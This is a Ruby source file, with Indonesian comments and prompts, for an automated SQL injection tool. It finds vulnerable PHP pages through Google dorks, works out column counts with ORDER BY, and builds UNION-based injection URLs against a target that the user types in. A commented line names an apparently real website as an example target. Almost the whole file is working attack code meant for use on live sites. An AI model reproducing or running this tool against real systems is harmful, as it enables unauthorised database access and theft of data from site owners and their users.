require 'net/http'
require 'nokogiri'

# ALAT_DORK = %q(https://www.google.com/search?q=)
# TARGET = "site:%s .php?%s="

# print "masukkan web: "
# wb = gets.chomp
# print "masukkan param: "
# pm = gets.chomp

# tg = TARGET % [wb, pm]

# puts "\n\n"
# permisi = "Silahkan pilih target lewat dorking \nklik "
# link = String.new.concat(ALAT_DORK, tg)
# puts permisi.concat(link.gsub!(/ /, "%20"))
# puts "\n\n"
# print "masukkan url dork target: "

# uri = URI.parse(gets)
# web = Net::HTTP.new(uri.host, uri.port)
# web.use_ssl = true
# reponse = web.get(uri.to_s)
# if reponse.code.to_i == 302
# 	reponse = web.get(reponse["location"])
# end

# meta_url = reponse.body.scan(/\<meta[^\>]+url=[^\>]+\>/)
# target_url = nil
# if meta_url.empty?
# 	print "Tidak ditemukan ; target : "
# 	target_url = gets
# else
# 	document = Nokogiri::HTML.parse(meta_url.first)
# 	target_url = document.css("meta").collect { |i| i.attribute('content') } .compact.first.value
# 	target_url.slice!(0, 2)
# end

load 'sql_injection.rb'
load 'pembuat_query.rb'

# target_url = "http://ecline.id/news-details.php?newsId=1" #Nanti Dihapus!
system("clear")
puts "\n\n\t"
print "Target URL : "
target_url = gets.chomp
target = SQL_Injection.new(target_url)
query = PembuatQuery.new.tap do |i|
	i.param = target_url.slice!(/(\d+)$/)
end

refresh_halaman = proc { target.refresh_halaman(target_url.clone.concat(query.query)) }

puts "\n\n"
order_by_pass = [nil.class, Array]



if order_by_pass.all? { |i| refresh_halaman.call.is_a?(i) }
	puts "ORDER BY SUKSES"
	puts "\n\n"
	query.melangkah
	begin
		loop do 
			# Nil adalah tidak berubah
			if query.data.nil? or query.data[:naik]
				query.kolom_tertinggal unless refresh_halaman.call.nil?
			else
				query.kolom_tertinggal if refresh_halaman.call.nil?
			end
		end
	rescue
		puts "KOLOM : #{query.kolom}"
	end
	query.melangkah
else
	puts "\nORDER BY GAGAL"
	print "Masukkan kolom: "
	query.kolom = gets.to_i
	query.melangkah.melangkah
end

puts "\n\n"
target.lihat_union = true
terikat = refresh_halaman.call
print "Gubrak : "
if terikat.empty?
	puts "(kosong)"
	puts "SQL Injection G-A-G-A-L"
	exit
else
	puts terikat.keys.join(', ')
end

query.melangkah.melangkah
puts "\n\n"

puts "Silahkan buka link aja"
query.data = terikat.keys.first.to_s.slice!(0, 1).to_i
puts target_url.concat(query.query)